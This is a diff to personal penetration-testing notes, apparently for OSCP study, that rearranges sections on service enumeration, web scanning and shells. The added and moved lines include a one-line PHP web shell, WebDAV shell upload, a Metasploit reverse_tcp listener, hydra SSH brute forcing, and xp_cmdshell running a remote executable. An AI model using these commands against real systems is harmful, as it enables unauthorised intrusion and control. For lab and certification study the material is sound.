@@ -171,36 +171,14 @@ GET / HTTP/1.0
 
 Smtp
 HELP	
+VRFY root
+VRFY idonotexist
+
 
 pop3
 USER bob
 PASS bob
 			
-
-Web stuff!!
-whatweb
-Nikto
-wpscan
-dirb
-dirbuster 
-recon-ng
-curl -k
-wget
-gobuster -u http://10.11.1.71 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
-http PUT access:   
-cadaver http://target:8080/dav
-dav:/dav/> put /tmp/shell.php         (or whatever language of shell)
-OR      nmap -p 80 192.168.1.4 –script http-put –script-args http-put.url=’/dav/nmap.php’,http-put.file=’/root/Desktop/nmap.php’
-
-File upload bypasses:
-http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html
-https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf 
-
-pentest-monkey webshells 
-some are included with kali
-
-<?php echo system($_GET["cmd"]); ?>
-
 
 SMB enumeration
 
@@ -345,7 +323,6 @@ You may encounter NoSQL instances like MongoDB in your OSCP journey (`/cgi-bin/m
             python nosqlmap.py --help
 mssql_exec (msf module, can be done manually)   EXEC master..xp_cmdshell ‘\\[IP]\tmpshare\shell.exe’
 
-Exampl
 
 RPC and abusing NFS shares:
 apt-get install rpcbind && apt-get install nfs-common
@@ -356,6 +333,28 @@ mount -t nfs 192.168.23.128:/backup /tmp/nfs -o nolock  (copy the files you find
 
 
 
+Web stuff!!   (I am not doing this section justice, but at least a starting point)
+whatweb
+Nikto
+dirb
+gobuster
+dirbuster
+recon-ng
+curl -k
+wget
+wpscan
+
+common examples:
+dirb http://192.168.0.12/           (uses default common word list)
+gobuster dir --url https://10.11.1.237/ --wordlist /usr/share/wordlists/dirb/common.txt --followredirect --insecuressl      (use for https site with self-gen certs)
+
+
+
+gobuster -u http://10.11.1.71 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+http PUT access:   
+cadaver http://target:8080/dav
+dav:/dav/> put /tmp/shell.php         (or whatever language of shell)
+OR      nmap -p 80 192.168.1.4 –script http-put –script-args http-put.url=’/dav/nmap.php’,http-put.file=’/root/Desktop/nmap.php’
 
 
  
@@ -366,8 +365,8 @@ tcpdump -n -v -i [interface] host 10.XX.XX.XX
 
 top with iptables for monitoring tunnels 
 
-netstat -antup (check for listening/established connections (tcp) )
-netstat -s  (stats by protocol)
+ss -antup (check for listening/established connections (tcp) ) (used to be netstat, depricated)
+ss -s  (stats by protocol)
 
 exploit options:
 searchsploit
@@ -389,10 +388,30 @@ msf > show advanced
 msf > search type:exploits psexec
 
 
+Quickly setup a metasploit listener (copy-paste these commands in after changing variables to what you need)
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.202.9
+set lport 443
+set EnableStageEncoding true
+options
+advanced
+run -j
+
 
 SSH:
 Bruteforcing (come up with username list from enumeration, use wordlists for common pass)
 hydra -e nsr -V -F -t 4 -u -L /root/userlist-pumpkin.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.131:22
+
+
+File upload bypasses:
+http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html
+https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf 
+
+pentest-monkey webshells 
+some are included with kali, see section below for more
+
+<?php echo system($_GET["cmd"]); ?>
 
 
 Shells
@@ -1033,6 +1052,8 @@ Enumerate as much as you can! Then,
 
 Windows:
 http://www.fuzzysecurity.com/tutorials/16.html 
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+
 https://guif.re/windowseop
 https://github.com/pentestmonkey/windows-privesc-check/ 
 https://github.com/411Hall/JAWS/ 
